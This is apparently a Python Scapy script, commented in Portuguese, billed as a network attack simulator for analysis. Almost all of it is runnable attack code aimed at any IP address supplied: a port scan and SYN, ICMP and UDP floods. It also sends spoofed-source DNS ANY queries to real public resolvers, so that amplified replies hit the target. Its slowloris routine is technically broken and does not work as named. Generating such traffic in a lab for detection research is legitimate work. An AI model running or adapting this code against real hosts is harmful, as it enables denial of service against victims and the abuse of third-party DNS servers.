from scapy.all import *
import random
import time
import os
import sys
import argparse

def port_scan(target):
    """Simula Port Scanning"""
    print(f"Iniciando Port Scan contra {target}...")
    i = random.randrange(0, 2000)
    for port in range(i, i + 1000):
        send(IP(dst=target)/TCP(dport=port, flags="S"), verbose=0)

def syn_flood(target):
    """Simula SYN Flood"""
    print(f"Iniciando SYN Flood contra {target}...")
    for _ in range(150):
        sport = random.randint(1024, 65535)
        send(IP(dst=target)/TCP(sport=sport, dport=80, flags="S"), verbose=0)

def icmp_flood(target):
    """Simula ICMP Flood"""
    print(f"Iniciando ICMP Flood contra {target}...")
    for _ in range(600):
        send(IP(dst=target)/ICMP(), verbose=0)

def udp_flood(target):
    """Simula UDP Flood Attack"""
    print(f"Iniciando UDP Flood contra {target}...")
    for _ in range(200):
        dport = random.randint(1, 65535)
        payload = Raw(b"X" * random.randint(64, 1200))
        send(IP(dst=target)/UDP(dport=dport)/payload, verbose=0)

def dns_amplification(target):
    """Simula DNS Amplification Attack"""
    print(f"Iniciando DNS Amplification contra {target}...")
    # Simulando pacotes de consulta DNS com IP de origem falsificado
    dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]  # Exemplos de servidores DNS
    for _ in range(100):
        dns_server = random.choice(dns_servers)
        # Cria uma consulta DNS do tipo ANY (que gera respostas grandes)
        # Usando valor 255 para qtype "ANY"
        dns_req = IP(src=target, dst=dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com", qtype=255))
        send(dns_req, verbose=0)

def slowloris(target):
    """Simula Slowloris Attack"""
    print(f"Iniciando Slowloris contra {target}...")
    # Simula conexões HTTP incompletas
    for _ in range(100):
        sport = random.randint(1024, 65535)
        # Inicia conexão TCP
        send(IP(dst=target)/TCP(sport=sport, dport=80, flags="S"), verbose=0)
        # Envia cabeçalhos HTTP parciais
        for i in range(5):
            http_header = "X-Header-{}: {}".format(i, "A" * random.randint(1, 10))
            send(IP(dst=target)/TCP(sport=sport, dport=80, flags="A")/Raw(http_header), verbose=0)
            time.sleep(0.1)  # Atraso proposital entre envios

def main(target, duration=60):
    print(f"Configurado para atacar: {target}")
    print(f"Duração programada: {duration} segundos")
    
    start_time = time.time()
    
    while time.time() - start_time < duration:
        attack = random.choice([
            "port_scan", 
            "syn_flood", 
            "icmp_flood", 
            "udp_flood",
            "dns_amplification",
            "slowloris"
        ])
        
        if attack == "port_scan":
            port_scan(target)
        elif attack == "syn_flood":
            syn_flood(target)
        elif attack == "icmp_flood":
            icmp_flood(target)
        elif attack == "udp_flood":
            udp_flood(target)
        elif attack == "dns_amplification":
            dns_amplification(target)
        else:
            slowloris(target)
            
        time.sleep(random.randint(1, 5))
    
    print(f"Ataque finalizado após {duration} segundos")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulador de ataques de rede para análise")
    parser.add_argument("target", help="Endereço IP do alvo")
    parser.add_argument("-t", "--time", type=int, default=60, 
                        help="Duração do ataque em segundos (padrão: 60)")
    parser.add_argument("--attack-type", type=str, 
                        choices=["port_scan", "syn_flood", "icmp_flood", "udp_flood", 
                                "dns_amplification", "slowloris", "random"],
                        default="random",
                        help="Tipo específico de ataque a executar (padrão: random)")
    args = parser.parse_args()
    
    if args.attack_type == "random":
        main(args.target, args.time)
    else:
        # Executa um ataque específico
        print(f"Executando ataque específico: {args.attack_type}")
        if args.attack_type == "port_scan":
            port_scan(args.target)
        elif args.attack_type == "syn_flood":
            syn_flood(args.target)
        elif args.attack_type == "icmp_flood":
            icmp_flood(args.target)
        elif args.attack_type == "udp_flood":
            udp_flood(args.target)
        elif args.attack_type == "dns_amplification":
            dns_amplification(args.target)
        elif args.attack_type == "slowloris":
            slowloris(args.target)